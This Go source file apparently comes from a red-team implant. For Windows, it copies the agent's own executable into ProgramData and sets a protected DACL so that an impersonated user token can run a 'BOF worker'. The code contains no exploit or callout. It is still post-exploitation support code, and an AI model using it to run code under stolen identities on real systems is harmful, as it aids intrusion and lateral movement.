//go:build windows

package pivot

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"

	"golang.org/x/sys/windows"
)

// Selected identities need access to a worker executable even when the agent
// lives in another user's private profile. The copied executable is short
// lived, and its protected DACL gives the selected SID only read/execute.
func stageWorkerFile(ctx context.Context, prefix, name string, source []byte) (string, func(), error) {
	base := os.TempDir()
	selected := operationToken(ctx)
	if selected != 0 {
		var err error
		base, err = windows.KnownFolderPath(windows.FOLDERID_ProgramData, windows.KF_FLAG_DEFAULT)
		if err != nil {
			return "", nil, fmt.Errorf("locate ProgramData for selected-token worker staging: %w", err)
		}
	}
	directory, err := os.MkdirTemp(base, prefix)
	if err != nil {
		return "", nil, fmt.Errorf("create worker directory: %w", err)
	}
	cleanup := func() { _ = os.RemoveAll(directory) }
	if selected != 0 {
		if err := protectWorkerPath(directory, selected); err != nil {
			cleanup()
			return "", nil, fmt.Errorf("grant selected identity access to worker directory: %w", err)
		}
	}
	path := filepath.Join(directory, name)
	if err := os.WriteFile(path, source, 0700); err != nil {
		cleanup()
		return "", nil, fmt.Errorf("write worker executable: %w", err)
	}
	if selected != 0 {
		if err := protectWorkerPath(path, selected); err != nil {
			cleanup()
			return "", nil, fmt.Errorf("grant selected identity access to worker executable: %w", err)
		}
	}
	return path, cleanup, nil
}

func protectWorkerPath(path string, selected windows.Token) error {
	selectedUser, err := selected.GetTokenUser()
	if err != nil {
		return err
	}
	var processToken windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &processToken); err != nil {
		return err
	}
	defer processToken.Close()
	processUser, err := processToken.GetTokenUser()
	if err != nil {
		return err
	}
	sddl := fmt.Sprintf("D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;%s)(A;;FRFX;;;%s)", processUser.User.Sid.String(), selectedUser.User.Sid.String())
	descriptor, err := windows.SecurityDescriptorFromString(sddl)
	if err != nil {
		return err
	}
	dacl, _, err := descriptor.DACL()
	if err != nil {
		return err
	}
	err = windows.SetNamedSecurityInfo(path, windows.SE_FILE_OBJECT, windows.DACL_SECURITY_INFORMATION|windows.PROTECTED_DACL_SECURITY_INFORMATION, nil, nil, dacl, nil)
	runtime.KeepAlive(descriptor)
	return err
}

func bofWorkerExecutable(ctx context.Context) (string, func(), error) {
	executable, err := os.Executable()
	if err != nil {
		return "", nil, err
	}
	if operationToken(ctx) == 0 {
		return executable, func() {}, nil
	}
	source, err := os.ReadFile(executable)
	if err != nil {
		return "", nil, fmt.Errorf("read BOF worker executable: %w", err)
	}
	return stageWorkerFile(ctx, "undertow-bof-", "worker.exe", source)
}
